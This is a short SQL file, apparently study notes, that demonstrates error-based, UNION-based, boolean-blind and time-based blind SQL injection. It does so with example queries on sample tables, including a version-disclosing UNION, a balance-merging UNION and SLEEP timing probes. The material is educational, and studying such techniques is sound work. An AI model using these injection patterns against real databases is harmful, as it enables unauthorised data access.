-- Error-based SQL Injection
SELECT * FROM students WHERE id = 1 AND 1=2 UNION SELECT 1, @@version,NULL;

SELECT * FROM customer;
SELECT * FROM micro_statement;

-- UNION-based SQL Injection

SELECT acc_no, avail_balance FROM customer Where acc_no=1001 UNION SELECT acc_no, avail_balance FROM micro_statement;

-- Boolean-based Blind SQL Injection

SELECT * FROM students WHERE id = 1 AND 1=1; -- IF True, returns normal page
SELECT * FROM students WHERE id = 1 AND 1=2; -- IF False, returns different page

-- Time-based Blind SQL Injection

SELECT IF(1=1,SLEEP(5),0);
SELECT IF(name = 'Yousuf',SLEEP(5),0) FROM students;